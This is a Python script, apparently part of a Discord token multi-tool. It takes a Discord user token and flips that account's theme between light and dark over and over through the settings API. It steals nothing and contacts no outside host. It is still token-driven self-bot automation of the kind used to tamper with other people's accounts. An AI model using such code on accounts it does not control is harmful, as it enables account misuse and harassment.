from Config.Util import *
from Config.Config import *
from Config.Translates import *

current_language = LANGUAGE

def tr(key):
    return translations[current_language].get(key, key)

try:
    import requests
    import time
    from itertools import cycle
except Exception as e:
   ErrorModule(e)
   

Title("Discord Token Theme Changer")

try:
    print()
    token = Choice1TokenDiscord()

    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code == 200:
        try:
            amount = int(input(f"{primary}{INPUT} {tr('CycleNumber')} -> {color.RESET}"))
        except:
            ErrorNumber()
                
        modes = cycle(["light", "dark"])
        for i in range(amount):
            try:
                theme = next(modes)
                print(f"{primary}[{secondary}{current_time_hour()}{primary}] {ADD} Status: {color.WHITE}{tr('Changed')}{primary} | Theme: {color.WHITE}{theme}{primary}")
                time.sleep(0.5)
                setting = {'theme': theme}
                requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
            except:
                print(f"{primary}[{secondary}{current_time_hour()}{primary}] {ERROR} Status:  {color.WHITE}{tr('Changed')}{primary}  | Theme: {color.WHITE}{theme}{primary}")

        print(f"{primary}{INFO} Finish.")
        Continue()
        Reset()
    else:
        ErrorToken()
except Exception as e:
    Error(e)